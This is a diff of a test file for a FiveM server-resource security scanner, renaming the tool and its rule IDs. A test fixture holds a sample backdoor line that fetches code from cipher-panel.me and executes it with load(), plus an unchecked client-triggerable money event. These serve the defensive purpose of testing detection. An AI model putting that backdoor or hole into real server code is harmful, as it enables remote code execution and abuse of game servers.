@@ -21,7 +21,7 @@ async function put(path: string, content: string | Buffer): Promise<void> {
 }
 
 before(async () => {
-  root = await mkdtemp(join(tmpdir(), 'fivem-audit-'));
+  root = await mkdtemp(join(tmpdir(), 'fivem-sentinel-'));
   await put('[shops]/bad_shop/fxmanifest.lua', "fx_version 'cerulean'\ngame 'gta5'\nserver_scripts { 'sv/*.lua' }\nclient_script 'cl.lua'");
   await put('[shops]/bad_shop/sv/main.lua', "RegisterNetEvent('shop:buy', function(amount)\n  xPlayer.addMoney(amount)\nend)\nPerformHttpRequest('https://cipher-panel.me/x', function(e, d) load(d)() end)");
   await put('[shops]/bad_shop/cl.lua', "RegisterNetEvent('shop:buy', function(amount)\n  xPlayer.addMoney(amount)\nend)");
@@ -50,8 +50,8 @@ describe('scan', () => {
     assert.equal(clean.findings.length, 0);
     assert.equal(clean.score, 100);
     assert.ok(bad.score < 40);
-    assert.deepEqual([...new Set(bad.findings.map((f) => f.ruleId))].sort(), ['FA001', 'FA002', 'FA006', 'FA008']);
-    assert.ok(bad.findings.every((f) => !f.file.endsWith('cl.lua') || f.ruleId !== 'FA006'));
+    assert.deepEqual([...new Set(bad.findings.map((f) => f.ruleId))].sort(), ['FS001', 'FS002', 'FS006', 'FS008']);
+    assert.ok(bad.findings.every((f) => !f.file.endsWith('cl.lua') || f.ruleId !== 'FS006'));
   });
 
   it('skips node_modules, stream folders, binaries and symlinks', async () => {
@@ -90,6 +90,6 @@ describe('cli', () => {
 
   it('prints json', async () => {
     const out = await run(process.execPath, [CLI, root, '-f', 'json', '--fail-on', 'none']);
-    assert.equal(JSON.parse(out.stdout).tool.name, 'fivem-audit');
+    assert.equal(JSON.parse(out.stdout).tool.name, 'fivem-sentinel');
   });
 });
